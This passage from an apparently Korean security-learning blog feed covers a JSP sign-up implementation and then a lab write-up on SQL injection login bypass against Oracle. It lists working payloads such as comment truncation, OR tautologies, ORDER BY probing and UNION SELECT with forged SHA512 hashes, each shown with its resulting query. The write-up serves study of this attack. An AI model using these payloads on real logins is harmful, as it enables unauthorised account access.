    <li><code class="language-plaintext highlighter-rouge">LoginAuthentication.isExistUserName(getServletContext(), username);</code> 를 통해 존재하는 유저인지 판단할 수 있다.<br /><script src="https://gist.github.com/MinGyu2/738f5d2240625fccce92b5213fcaabb3.js"></script></li>
  </ul>
</blockquote>

<blockquote>
  <p><strong>UsersDAO</strong> class에서 isExistUserName 함수 부분 코드<br /><script src="https://gist.github.com/MinGyu2/363caaa55ac904382e56c801dcce6b35.js"></script></p>
  <ul>
    <li>이미 존재하는 유저면 <code class="language-plaintext highlighter-rouge">true</code>를 리턴하고 존재안하는 유저면 <code class="language-plaintext highlighter-rouge">false</code>를 리턴한다.</li>
  </ul>
</blockquote>

<blockquote>
  <p><strong>회원가입 JSP 전체 코드(클라이언트)</strong><br /><script src="https://gist.github.com/MinGyu2/d8e184b74e83a72c4772e20e6c42d159.js"></script></p>
</blockquote>

<p><br /></p>
<h3 id="이메일-형식인지-확인">이메일 형식인지 확인</h3>
<hr />
<blockquote>
  <p><strong>자바스크립트를 통해 이메일 형식인지 확인하다.</strong><br /><script src="https://gist.github.com/MinGyu2/485eceb2ce9abaf1c97ef67bcf0bc371.js"></script></p>
  <ul>
    <li>이메일을 입력하고 다음 입력창으로 넘어가면 <code class="language-plaintext highlighter-rouge">onchange='email_change()'</code> 옵션을 통해 자동으로 위의 함수가 실행된다.</li>
    <li>정규식을 통해 이메일 형식인지 확인한다.<br /><img src="https://user-images.githubusercontent.com/31990118/233336731-a2be5db6-6395-469e-ad5c-b5d481f752fe.png" alt="image" /></li>
  </ul>
</blockquote>

<p><br /></p>
<h3 id="비밀번호-일치-확인">비밀번호 일치 확인</h3>
<hr />
<blockquote>
  <p><strong>자바스크립트를 통해 비밀번호가 서로 일치하는지 확인한다.</strong><br /><script src="https://gist.github.com/MinGyu2/ec8eb649562e27a5f05c92c7b92b50e3.js"></script></p>
  <ul>
    <li>비밀번호를 입혁하고 다음 입력창으로 넘어가면 <code class="language-plaintext highlighter-rouge">onchange='pwd_confirm()'</code> 옵션을 통해 자동으로 위의 함수가 실행된다.</li>
    <li>두개의 비밀번호를 비교하여 일치하면 성공이고 다르면 “일치안함” 메세지를 사용자에게 보여준다.<br /><img src="https://user-images.githubusercontent.com/31990118/233336814-d63b3904-17ad-4b2e-9985-206b29f1a483.png" alt="image" />
<br /><img src="https://user-images.githubusercontent.com/31990118/233337192-9757ab02-99b7-48ae-b153-1fca92fbdbe6.png" alt="image" /></li>
  </ul>
</blockquote>

<p><br /><br /></p>
<h2 id="회원가입-버튼-누른-후">회원가입 버튼 누른 후</h2>

<p><br /></p>
<h3 id="회원가입-클라이언트">회원가입 (클라이언트)</h3>
<hr />
<blockquote>
  <p><strong>회원가입 버튼 누른 후 동작 이벤트</strong><br /><script src="https://gist.github.com/MinGyu2/31a2b857fcfac7617b3cbfb255089626.js"></script></p>
  <ul>
    <li>회원정보를 전부 입력한 후 <strong>회원가입</strong> 버튼을 누르면 <code class="language-plaintext highlighter-rouge">onclick="sign_up()"</code> 옵션에 의해 위의 함수가 동작한다.</li>
    <li>서버로 입력한 정보를 보내기전 id 중복 확인을 했는지, email 형식이 맞는지, 비밀번호가 서로 일치하는지 확인한다.</li>
    <li>모두 통과가 되면 post 형식으로 입력한 데이터를 서버로 전달한다.</li>
    <li>자바스크립트에서 post 형식으로 전송하는 방법은 없다. 따라서 form과 input 요소를 만들어주고 body에 추가한 후 post 전송을 해 줘야한다.</li>
  </ul>
</blockquote>

<p><br /></p>
<h3 id="회원가입-서버">회원가입 (서버)</h3>
<hr />
<blockquote>
  <p><strong>회원가입</strong><br /><script src="https://gist.github.com/MinGyu2/274abc0e913bf1d8f71e71363ec033dd.js"></script></p>
  <ul>
    <li>서버는 클라이언트에서 post 전송한 <code class="language-plaintext highlighter-rouge">아이디</code>, <code class="language-plaintext highlighter-rouge">이메일</code>, <code class="language-plaintext highlighter-rouge">비밀번호</code>, <code class="language-plaintext highlighter-rouge">비밀번호 확인</code>을 받는다.</li>
    <li>SignUp 클래스의 <code class="language-plaintext highlighter-rouge">아이디</code>, <code class="language-plaintext highlighter-rouge">이메일</code>, <code class="language-plaintext highlighter-rouge">비밀번호</code>, <code class="language-plaintext highlighter-rouge">비밀번호 확인</code>를 인자로 받는 createUser 함수를  이용하여 유저를 만들어준다.</li>
    <li>계정생성에 실패를 하면 <code class="language-plaintext highlighter-rouge">fail</code> 경고 창을 보여준다. 그 다음 회원가입 창으로 다시 돌아온다.<br /><img src="https://user-images.githubusercontent.com/31990118/233332309-06785554-751e-4e06-9d21-b7f836176f65.png" alt="Pasted image 20230420180533" />
<br /><img src="https://user-images.githubusercontent.com/31990118/233332365-854571a6-47ef-41b4-80dd-6f1a33fde2fa.png" alt="Pasted image 20230420180559" /></li>
    <li>계정생성에 성공하면 success 창을 보여준다. 그 다음 로그인 창으로 이동한다.<br /><img src="https://user-images.githubusercontent.com/31990118/233332463-b75b9e82-b55c-4e9e-8feb-1f6c17f021b4.png" alt="Pasted image 20230420182057" />
<br /><img src="https://user-images.githubusercontent.com/31990118/233332511-ce87dd92-3a9c-4710-abca-cbe0bd1f6c28.png" alt="Pasted image 20230420182109" /></li>
  </ul>
</blockquote>

<p><br /><br /></p>
<h2 id="전체코드">전체코드</h2>

<blockquote>
  <p><strong>로그인 페이지 전체 코드</strong><br /><script src="https://gist.github.com/MinGyu2/3212b923469a3b72b67a13e6f6b4d51c.js"></script></p>
</blockquote>

<blockquote>
  <p><strong>LoginAuthentication 클래스 코드</strong> <br /><script src="https://gist.github.com/MinGyu2/a23d33cdf3ea3337b87849d774a01149.js"></script></p>
</blockquote>

<blockquote>
  <p><strong>UsersDAO 클래스 코드</strong><br /><script src="https://gist.github.com/MinGyu2/af111b0e426e4b9b4067bd1e4e88535f.js"></script></p>
</blockquote>

<blockquote>
  <p><strong>SignUp 클래스 코드</strong><br /><script src="https://gist.github.com/MinGyu2/7025dc86b1a157e32f024cfd84f52c34.js"></script></p>
</blockquote>

<p><br /><br /></p>
<h3 id="참고-사이트">참고 사이트</h3>
<hr />
<ul>
  <li><a href="https://www.baeldung.com/java-email-validation-regex">Email Validation in Java</a></li>
  <li><a href="https://yceffort.kr/2020/01/think-about-fetch">자바스크립트에서 http 요청하기 - fetch에 대한 고찰 – yceffort</a></li>
  <li><a href="https://kang-james.tistory.com/entry/JSP-%EC%95%84%EC%9D%B4%EB%94%94-%EC%A4%91%EB%B3%B5-%EC%B2%B4%ED%81%AC-%EA%B8%B0%EB%8A%A5-%EA%B5%AC%ED%98%84-%EB%8F%99%EA%B8%B0-%EB%B0%A9%EC%8B%9D">JSP 아이디 중복 체크 기능 구현 동기 방식 (tistory.com)</a></li>
  <li><a href="https://www.freecodecamp.org/korean/news/javascripteseo-gajang-jal-alryeojin-http-yoceong-bangbeob-2/">JavaScript에서 가장 잘 알려진 HTTP 요청 방법 (freecodecamp.org)</a></li>
  <li><a href="https://cocoon1787.tistory.com/700">회원가입 창 만들기 (HTML, CSS, JS / 입력형식체크, 문자인증 기능추가)</a></li>
  <li><a href="https://imthekingofcoding.tistory.com/30">JavaScript - 이메일 유효성 검사 (회원가입) (tistory.com)</a></li>
  <li><a href="https://blog.naver.com/PostView.nhn?blogId=seonghun7304&amp;logNo=221583410491">location href를 POST로 보내는 방법</a></li>
  <li><a href="http://www.oncode.co.kr/onbr/brd/board/?pgk=/tip/board/view/1/275&amp;lang=ko">CSS div 안보이게 하는 방법, div hidden, display none</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="Web" /><category term="Oracle DB" /><category term="Java" /><category term="Servlet" /><category term="JSP" /><summary type="html"><![CDATA[회원가입 구현하기.]]></summary></entry><entry><title type="html">SQL Injection 로그인 우회</title><link href="http://localhost:4000/SQLInjection/" rel="alternate" type="text/html" title="SQL Injection 로그인 우회" /><published>2023-04-19T00:00:00+09:00</published><updated>2023-04-19T23:13:00+09:00</updated><id>http://localhost:4000/SQLInjection</id><content type="html" xml:base="http://localhost:4000/SQLInjection/"><![CDATA[<h2 id="sql-injection-이란">SQL Injection 이란?</h2>
<ul>
  <li>sql 질의문을 삽입하는 공격이다. 즉 sql 질의문에 악의적인 코드를 배치하는 공격이다.</li>
  <li>웹 해킹 기술중 하나이다.</li>
</ul>

<blockquote>
  <p>목적</p>
  <ul>
    <li>정보 유출</li>
    <li>저장된 데이터 유출 및 조작</li>
    <li>인증 우회</li>
  </ul>
</blockquote>

<blockquote>
  <p>실습 환경</p>
  <ul>
    <li>DB 서버 : Rocky-8.7</li>
    <li>DB 버전 : oracle-database-xe-21c</li>
  </ul>
</blockquote>

<blockquote>
  <p><strong>members</strong> 테이블 구조</p>
</blockquote>

<table>
  <thead>
    <tr>
      <th>sid</th>
      <th>id</th>
      <th>password</th>
      <th>email</th>
      <th>info</th>
      <th>hashpwd</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>integer PRIMARY KEY</td>
      <td>VARCHAR(60)</td>
      <td>VARCHAR(60)</td>
      <td>VARCHAR(60)</td>
      <td>VARCHAR(60)</td>
      <td>CHAR(128)</td>
    </tr>
  </tbody>
</table>

<ul>
  <li><strong>hashpwd</strong> 컬럼은 password를 해시(SHA512) 암호화를 한 것 이다.</li>
  <li>실제로 유저 정보를 저장하기 위한 테이블을 구성할 때는 해시 암호화된 비밀번호만 저장해야한다.</li>
</ul>

<p><br /><br /></p>
<h2 id="로그인-방식에-따른-sql-인젝션-공격방식">로그인 방식에 따른 sql 인젝션 공격방식</h2>
<ul>
  <li>식별
    <ul>
      <li>많은 데이터 중에서 특별한 데이터를 가려내는것.</li>
    </ul>
  </li>
  <li>인증
    <ul>
      <li>그 사람이 맞는지 확인하는 작업. ( 비밀번호 인증 )</li>
    </ul>
  </li>
</ul>

<h4 id="1-식별과-인증을-동시에-할-때">1. 식별과 인증을 동시에 할 때</h4>
<ul>
  <li>하나의 <code class="language-plaintext highlighter-rouge">sql 질의문</code> 으로 식별과 인증을 완료한다.</li>
</ul>

<blockquote>
  <p>로그인방법</p>
  <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">members</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'아이디'</span> <span class="k">and</span> <span class="n">PASSWORD</span><span class="o">=</span><span class="s1">'비번'</span>
</code></pre></div>  </div>
  <ul>
    <li><strong>아이디</strong>와 <strong>비밀번호</strong>를 동시에 일치하면 사용자 정보가 나온다. 이러한 정보가 나오면 로그인에 성공한 것이다.</li>
    <li>하지만 아무 정보도 안나오면 로그인에 실패 한 것이다.</li>
  </ul>
</blockquote>

<blockquote>
  <p>로그인 코드
<script src="https://gist.github.com/MinGyu2/348f7a0e850908a350bb766f307d8e9a.js"></script></p>
  <ul>
    <li>다음 코드를 통해 인증을 한다.
      <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">var</span> <span class="n">member</span> <span class="o">=</span> <span class="n">auth</span><span class="o">.</span><span class="na">authAndMember</span><span class="o">(</span><span class="n">id</span><span class="o">,</span> <span class="n">pwd</span><span class="o">);</span>
</code></pre></div>      </div>
    </li>
  </ul>
</blockquote>

<blockquote>
  <p>정상적인 로그인<br />
<img src="https://user-images.githubusercontent.com/31990118/232983137-92129ab9-a389-43c0-93b9-46e70de832ce.png" alt="Pasted image 20230419141436" /><br /><img src="https://user-images.githubusercontent.com/31990118/232983198-a896785d-032c-47a7-9dac-905c0a7fe3a8.png" alt="Pasted image 20230419141453" /></p>
</blockquote>

<p><br /></p>
<blockquote>
  <p><strong>공격 방법</strong></p>
</blockquote>

<ul>
  <li><strong>주석을 이용한 인증우회(1)</strong></li>
</ul>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>입력</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>id</td>
      <td><code class="language-plaintext highlighter-rouge">user2'--</code></td>
    </tr>
    <tr>
      <td>pwd</td>
      <td>` `</td>
    </tr>
  </tbody>
</table>

<ul>
  <li>서버에서 완성된 쿼리문<br />
<code class="language-plaintext highlighter-rouge">select * from members where id='user2'--' and PASSWORD=' '</code><br /><img src="https://user-images.githubusercontent.com/31990118/232983978-af5bd6a4-cc9b-4c5b-a130-155f58121b71.png" alt="Pasted image 20230419044643" /><br /><img src="https://user-images.githubusercontent.com/31990118/232984069-0c3d894b-edfe-43c0-a4b2-04349fee4065.png" alt="Pasted image 20230419044620" /></li>
</ul>

<p><br /></p>
<ul>
  <li><strong>주석을 이용한 인증우회(2)</strong></li>
</ul>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>입력</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>id</td>
      <td><code class="language-plaintext highlighter-rouge">user2'/*</code></td>
    </tr>
    <tr>
      <td>pwd</td>
      <td><code class="language-plaintext highlighter-rouge">*/and '1'='1</code></td>
    </tr>
  </tbody>
</table>

<ul>
  <li>서버에서 완성된 쿼리문<br />
<code class="language-plaintext highlighter-rouge">select * from members where id='user2'/*' and password='*/and '1'='1';</code><br /><img src="https://user-images.githubusercontent.com/31990118/232984619-32b03055-7784-4d7b-ad5e-15a7bf6f1dd8.png" alt="Pasted image 20230419141124" /><br /><img src="https://user-images.githubusercontent.com/31990118/232984682-5b1c1f8e-bd5b-442c-a209-f732dcf21e26.png" alt="Pasted image 20230419141032" /></li>
  <li>블럭 단위로 주석처리 하였다.</li>
</ul>

<p><br /></p>
<ul>
  <li><strong>or 이용한 인증우회</strong></li>
</ul>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>입력</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>id</td>
      <td><code class="language-plaintext highlighter-rouge">user2' or '1'='1</code></td>
    </tr>
    <tr>
      <td>pwd</td>
      <td>` `</td>
    </tr>
  </tbody>
</table>

<ul>
  <li>서버에서 완성된 쿼리문<br />
<code class="language-plaintext highlighter-rouge">select * from members where id='user2' or '1'='1' and PASSWORD=' '</code><br /><img src="https://user-images.githubusercontent.com/31990118/232984798-75e83f27-fab3-4e09-b546-9f1bad9dff19.png" alt="Pasted image 20230419141300" /><br /><img src="https://user-images.githubusercontent.com/31990118/232984846-083c960b-50c9-4344-b391-e4486fb22736.png" alt="Pasted image 20230419141331" /></li>
  <li>비교연산자 우선순위에 의해 and 연산자 부분을 먼저 계산을 하고 or 연산을 계산한다.<br /><code class="language-plaintext highlighter-rouge">select * from members where (id='user2' or ('1'='1' and PASSWORD=' '))</code></li>
</ul>

<p><br /><br /></p>
<h4 id="2-식별과-인증을-따로-할-때">2. 식별과 인증을 따로 할 때</h4>

<blockquote>
  <p>로그인방법</p>
  <ol>
    <li>유저가 입력한 id와 <code class="language-plaintext highlighter-rouge">sql 질의문</code>을 통해 id 정보와 비밀번호 정보를 불러온다.<br /><code class="language-plaintext highlighter-rouge">select id,PASSWORD from members where id='아이디' </code></li>
    <li>입력받은 비밀번호와 db 에서 불러온 비밀번호를 비교하여 일치하는지 확인한다.</li>
    <li>일치하면 db 에서 불러온 id 정보를 통해 나머지 유저 정보도 불러온다.<br /><code class="language-plaintext highlighter-rouge">select * from members  where id='db에서 불러온 id정보';</code></li>
  </ol>
</blockquote>

<blockquote>
  <p>로그인 코드<br /><script src="https://gist.github.com/MinGyu2/7714a6942bb2726177f0dcbfef5caaa7.js"></script></p>
</blockquote>

<blockquote>
  <p>정상적인 로그인<br />
<img src="https://user-images.githubusercontent.com/31990118/232985187-5a0d4782-8d8a-4f53-bdd6-c6e636026a14.png" alt="Pasted image 20230419141842" /><br /><img src="https://user-images.githubusercontent.com/31990118/232985264-660444cd-f648-4933-8b3f-fb4b7d6e91c6.png" alt="Pasted image 20230419141903" /></p>
</blockquote>

<blockquote>
  <p>union을 이용한 우회 공격 전 정확한 <strong>컬럼 수</strong> 찾기</p>
  <ul>
    <li><code class="language-plaintext highlighter-rouge">order by</code> 를 이용한다.</li>
    <li><code class="language-plaintext highlighter-rouge">user2' order by 2 -- </code> 로그인 성공<br /><img src="https://user-images.githubusercontent.com/31990118/232985373-2f1890c3-e762-43ce-a675-28c7904f68ed.png" alt="Pasted image 20230419141937" /><br /><img src="https://user-images.githubusercontent.com/31990118/232985437-96a4348c-56d8-4fe1-bd1c-9628a2324d0c.png" alt="Pasted image 20230419141951" /></li>
    <li><code class="language-plaintext highlighter-rouge">user2' order by 3 -- </code> 로그인 실패<br /><img src="https://user-images.githubusercontent.com/31990118/232985581-b986925c-674e-45f9-a0a3-2d13dedb546d.png" alt="Pasted image 20230419142020" /><br /><img src="https://user-images.githubusercontent.com/31990118/232985629-99e7085d-df98-4268-b513-18ce477eb459.png" alt="Pasted image 20230419142050" /></li>
    <li>즉 컬럼의 수가 2개인 것을 확인할 수 있다.</li>
  </ul>
</blockquote>

<p><br /></p>
<blockquote>
  <p>공격 방법</p>
</blockquote>

<ul>
  <li><strong>union + 주석 사용</strong></li>
</ul>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>입력</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>id</td>
      <td><code class="language-plaintext highlighter-rouge">x' union select 'user2','user2' from dual -- </code></td>
    </tr>
    <tr>
      <td>pwd</td>
      <td><code class="language-plaintext highlighter-rouge">user2</code></td>
    </tr>
  </tbody>
</table>

<ul>
  <li>서버에서 완성된 쿼리문<br />
<code class="language-plaintext highlighter-rouge">select id,PASSWORD from members where id='x' union select 'user2','user2' from dual where '1'='1'</code><br /><img src="https://user-images.githubusercontent.com/31990118/232985841-7099d8b7-0441-4a9f-a001-5568d8614c67.png" alt="Pasted image 20230419142133" /><br /><img src="https://user-images.githubusercontent.com/31990118/232985915-ea61d625-85cd-4bca-9e58-dd7836dc3101.png" alt="Pasted image 20230419142152" /></li>
</ul>

<p><br /></p>
<ul>
  <li><strong>union + where 사용</strong></li>
</ul>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>입력</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>id</td>
      <td><code class="language-plaintext highlighter-rouge">x' union select 'user2','user2' from dual where '1'='1</code></td>
    </tr>
    <tr>
      <td>pwd</td>
      <td><code class="language-plaintext highlighter-rouge">user2</code></td>
    </tr>
  </tbody>
</table>

<ul>
  <li>서버에서 완성된 쿼리문<br />
<code class="language-plaintext highlighter-rouge">select id,PASSWORD from members where id='x' union select 'user2','user2' from dual where '1'='1'</code><br /><img src="https://user-images.githubusercontent.com/31990118/232986108-6e532e72-4254-4531-9464-ef82413d123f.png" alt="Pasted image 20230419142239" />
<br /><img src="https://user-images.githubusercontent.com/31990118/232986157-f68af392-ddb2-4a6b-829e-62e9ce649116.png" alt="Pasted image 20230419142252" /></li>
</ul>

<p><br /><br /></p>
<h4 id="3-식별과-인증을-동시에-할-때-hash-암호화된-비밀번호">3. 식별과 인증을 동시에 할 때(+ HASH 암호화된 비밀번호)</h4>
<ul>
  <li>웹서버는 사용자 사용하는 비밀번호를 HASH 암호화 하여 서버에 저장한다.</li>
</ul>

<blockquote>
  <p>로그인 방법</p>
  <ul>
    <li>하나의 <code class="language-plaintext highlighter-rouge">sql 질의문</code> 으로 식별과 인증을 완료한다는 것이다.
      <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">members</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'입력id'</span> <span class="k">and</span> <span class="n">hashpwd</span><span class="o">=</span><span class="n">standard_hash</span><span class="p">(</span><span class="s1">'입력 pwd'</span><span class="p">,</span><span class="s1">'SHA512'</span><span class="p">);</span>
</code></pre></div>      </div>
    </li>
    <li>웹 서버에서 pwd 를 바로 비교하는것이 아닌 <strong>SHA512</strong> 알고리즘으로 HASH 암호화한 값을 비교한다.</li>
    <li><strong>아이디</strong>와 <strong>비밀번호</strong>를 동시에 일치하면 유저 정보가 나온다. 이러한 정보가 나오면 로그인에 성공한 것이다.</li>
    <li>하지만 아무 정보도 안나오면 로그인에 실패 한 것이다.</li>
  </ul>
</blockquote>

<blockquote>
  <p>로그인 코드 <br />
<script src="https://gist.github.com/MinGyu2/10015945943d3c562131ca34225b8529.js"></script></p>
</blockquote>

<blockquote>
  <p>정상적인 로그인<br /><img src="https://user-images.githubusercontent.com/31990118/232986886-8bd775f2-b4ea-4d8f-81b5-1052e894f004.png" alt="Pasted image 20230419142438" />
<br /><img src="https://user-images.githubusercontent.com/31990118/232986977-ab3e49bb-012e-40a8-b726-725242bf5d8d.png" alt="Pasted image 20230419142455" /></p>
</blockquote>

<blockquote>
  <p>nvl 함수</p>
  <ul>
    <li>nvl 함수는 값이 null 인 경우 지정값을 출력하고 , 값이 null 아니면 그대로 출력한다.</li>
    <li>nvl(값,  지정값)</li>
    <li>‘1’ 은 null 이 아니다. 따라서 1이 출력된다.<br /><img src="https://user-images.githubusercontent.com/31990118/232987098-fed02520-2eab-4f8d-bf02-4e386a3d8166.png" alt="Pasted image 20230419143825" /></li>
  </ul>
</blockquote>

<p><br /></p>
<blockquote>
  <p>공격 방법</p>
</blockquote>

<ul>
  <li><strong>주석사용</strong></li>
</ul>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>입력</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>id</td>
      <td><code class="language-plaintext highlighter-rouge">user2' -- </code></td>
    </tr>
    <tr>
      <td>pwd</td>
      <td>` `</td>
    </tr>
  </tbody>
</table>

<ul>
  <li>서버에서 완성된 쿼리문<br />
<code class="language-plaintext highlighter-rouge">select id from members where id='user2' -- ' and hashpwd=standard_hash('ksdjfaklsf','SHA512')</code><br /><img src="https://user-images.githubusercontent.com/31990118/232990015-656e3828-1f9c-44ac-aef5-404079e11f67.png" alt="Pasted image 20230419142553" />
<br /><img src="https://user-images.githubusercontent.com/31990118/232990061-98b4cd2b-84f9-4ffb-85f8-3398a26fe40d.png" alt="Pasted image 20230419142616" /></li>
</ul>

<p><br /><br /></p>
<ul>
  <li><strong>주석 + or + nvl사용</strong> (members 테이블의 가장 상위에 있는 root 로 로그인된다.)</li>
</ul>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>입력</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>id</td>
      <td><code class="language-plaintext highlighter-rouge">user2'/*</code></td>
    </tr>
    <tr>
      <td>pwd</td>
      <td><code class="language-plaintext highlighter-rouge">*/ or '1'=nvl('1</code></td>
    </tr>
  </tbody>
</table>

<ul>
  <li>서버에서 완성된 쿼리문<br />
<code class="language-plaintext highlighter-rouge">select id from members where id='user2'/*' and hashpwd=standard_hash('*/ or '1'=nvl('1','SHA512')</code><br /><img src="https://user-images.githubusercontent.com/31990118/232990160-db93d3d4-95cc-4498-90b2-0d20d2a552df.png" alt="Pasted image 20230419142842" />
<br /><img src="https://user-images.githubusercontent.com/31990118/232990195-078251e2-8dec-4601-9bb3-b84fcd2eb24f.png" alt="Pasted image 20230419142857" /></li>
  <li>여기서 user2 사용자가 아닌 root로 로그인 된 것을 확인할 수 있다.</li>
  <li>서버에서 완성된 쿼리는 모든 사용자 정보를 불러오고 서버는 사용자 정보들 중 맨위에 존재하는 사용자의 정보를 가져와 보여준다.</li>
  <li>
    <p>테이블 맨위에는 root 사용자가 존재하여 root 계정으로 로그인된 것 이다.
<br /><br /></p>
  </li>
  <li><strong>주석 + and + nvl사용</strong></li>
</ul>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>입력</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>id</td>
      <td><code class="language-plaintext highlighter-rouge">user2'/*</code></td>
    </tr>
    <tr>
      <td>pwd</td>
      <td><code class="language-plaintext highlighter-rouge">*/ and '1'=nvl('1</code></td>
    </tr>
  </tbody>
</table>

<ul>
  <li>서버에서 완성된 쿼리문<br />
<code class="language-plaintext highlighter-rouge">select id from members where id='user2'/*' and hashpwd=standard_hash('*/ and '1'=nvl('1','SHA512')</code><br /><img src="https://user-images.githubusercontent.com/31990118/232990461-99c1e174-9ff6-4b03-ad3c-a65c52e55953.png" alt="Pasted image 20230419144106" /><br /><img src="https://user-images.githubusercontent.com/31990118/232990496-9034bd9e-eb22-41a4-8351-925d908d97e8.png" alt="Pasted image 20230419144117" /></li>
</ul>

<p><br /><br /></p>
<ul>
  <li><strong>or 이용하기</strong></li>
</ul>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>입력</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>id</td>
      <td><code class="language-plaintext highlighter-rouge">user2' or '1'='1</code></td>
    </tr>
    <tr>
      <td>pwd</td>
      <td>` `</td>
    </tr>
  </tbody>
</table>

<ul>
  <li>서버에서 완성된 쿼리문<br />
<code class="language-plaintext highlighter-rouge">select id from members where id='user2' or '1'='1' and hashpwd=standard_hash(' ','SHA512')</code><br /><img src="https://user-images.githubusercontent.com/31990118/232990748-9179397a-d4e8-4f39-b657-bbbcf04faa9c.png" alt="Pasted image 20230419143137" /><br /><img src="https://user-images.githubusercontent.com/31990118/232990788-47801f8e-ce8b-453b-a9a3-b43bb8ba0b98.png" alt="Pasted image 20230419143153" /></li>
</ul>

<p><br /><br /></p>
<h4 id="4-식별과-인증을-따로-할-때-비밀번호-sha512-하여-table에-저장">4. 식별과 인증을 따로 할 때(+ 비밀번호 SHA512 하여 table에 저장)</h4>

<blockquote>
  <p>로그인 방법</p>
  <ol>
    <li>유저가 입력한 id와 <code class="language-plaintext highlighter-rouge">sql 질의문</code>을 통해 id 정보와 해시로 저장된 비밀번호 정보를 불러온다.<br /><code class="language-plaintext highlighter-rouge">select id,hashpwd from members where id='아이디'</code></li>
    <li>유저가 입력한 비밀번호를 해시 암호화 알고리즘을 통해 암호화 한다.</li>
    <li>유저가 입력한 해시화 된 비밀번호와 db에서 불러온 해시화된 비밀번호를 비교한다.</li>
    <li>서로 일치하면 db 에서 불러온 <code class="language-plaintext highlighter-rouge">id</code> 정보를 이용하여 나머지 유저 정보도 불러온다.</li>
  </ol>
</blockquote>

<blockquote>
  <p>코드<br /><script src="https://gist.github.com/MinGyu2/3ba980c0793432ddb51eb184be586ff3.js"></script></p>
</blockquote>

<blockquote>
  <p>정상적인 로그인<br /><img src="https://user-images.githubusercontent.com/31990118/232991349-687a4c81-ef26-4c32-80b0-5bc5760cfecc.png" alt="Pasted image 20230419150421" />
<br /><img src="https://user-images.githubusercontent.com/31990118/232991402-b32657e8-1f6d-4feb-8c64-8ca1f3728d20.png" alt="Pasted image 20230419150437" /></p>
</blockquote>

<blockquote>
  <p>정확한 컬럼 수 찾기</p>
  <ul>
    <li><code class="language-plaintext highlighter-rouge">order by</code> 를 이용한다.</li>
    <li><code class="language-plaintext highlighter-rouge">user2' order by 2 -- </code> 로그인 성공<br /><img src="https://user-images.githubusercontent.com/31990118/232991510-58554a20-098d-4531-b5e1-f664afcb53b3.png" alt="Pasted image 20230419144418" /></li>
    <li>컬럼수가 2개라는 것을 알 수 있다.</li>
  </ul>
</blockquote>

<p><br /></p>
<blockquote>
  <p>공격방법</p>
</blockquote>

<ul>
  <li><strong>union 을 이용한다.</strong></li>
</ul>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>입력</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>id</td>
      <td><code class="language-plaintext highlighter-rouge">2' union select 'user2', cast(standard_hash('user2','SHA512') as char(128)) from dual --</code></td>
    </tr>
    <tr>
      <td>pwd</td>
      <td><code class="language-plaintext highlighter-rouge">user2</code></td>
    </tr>
  </tbody>
</table>

<ul>
  <li>서버에서 완성된 쿼리문<br />
<code class="language-plaintext highlighter-rouge">select id,hashpwd from members where id='x' union select 'user2', cast(standard_hash('user2','SHA512') as char(128)) from dual -- '</code><br /><img src="https://user-images.githubusercontent.com/31990118/233049085-c016daf8-8467-47ad-8d63-26668bfc33ac.png" alt="Pasted image 20230419145121" />
<br /><img src="https://user-images.githubusercontent.com/31990118/233049124-051680f1-71c0-45d5-b569-ff429fa6581a.png" alt="Pasted image 20230419145133" /></li>
</ul>

<p><br /></p>
<ul>
  <li><strong>직접 해시 암호한 값을 넣어준다.</strong></li>
</ul>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>입력</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>id</td>
      <td><code class="language-plaintext highlighter-rouge">2' union select 'user2', hash('a','SHA512') from dual --</code></td>
    </tr>
    <tr>
      <td>pwd</td>
      <td><code class="language-plaintext highlighter-rouge">a</code></td>
    </tr>
  </tbody>
</table>

<ul>
  <li>hash(‘a’,’SHA512’) = <code class="language-plaintext highlighter-rouge">1F40FC92DA241694750979EE6CF582F2D5D7D28E18335DE05ABC54D0560E0F5302860C652BF08D560252AA5E74210546F369FBBBCE8C12CFC7957B2652FE9A75</code></li>
  <li>서버에서 완성된 쿼리문<br />
<code class="language-plaintext highlighter-rouge">select id,hashpwd from members where id='2' union select 'user2', '1F40FC92DA241694750979EE6CF582F2D5D7D28E18335DE05ABC54D0560E0F5302860C652BF08D560252AA5E74210546F369FBBBCE8C12CFC7957B2652FE9A75' from dual --'</code><br /><img src="https://user-images.githubusercontent.com/31990118/233049465-179b0584-4be4-4702-a13a-e7ed0bb58b3c.png" alt="Pasted image 20230419145351" />
<br /><img src="https://user-images.githubusercontent.com/31990118/233049512-f9fe88e5-5ccb-4863-89e5-be94b3eaef62.png" alt="Pasted image 20230419145407" /></li>
</ul>

<p><br /></p>

<ul>
  <li><strong>주석 없이 하기</strong></li>
</ul>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>입력</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>id</td>
      <td><code class="language-plaintext highlighter-rouge">2' union select 'user2', cast(standard_hash('user2','SHA512') as char(128)) from dual where '1'='1 </code></td>
    </tr>
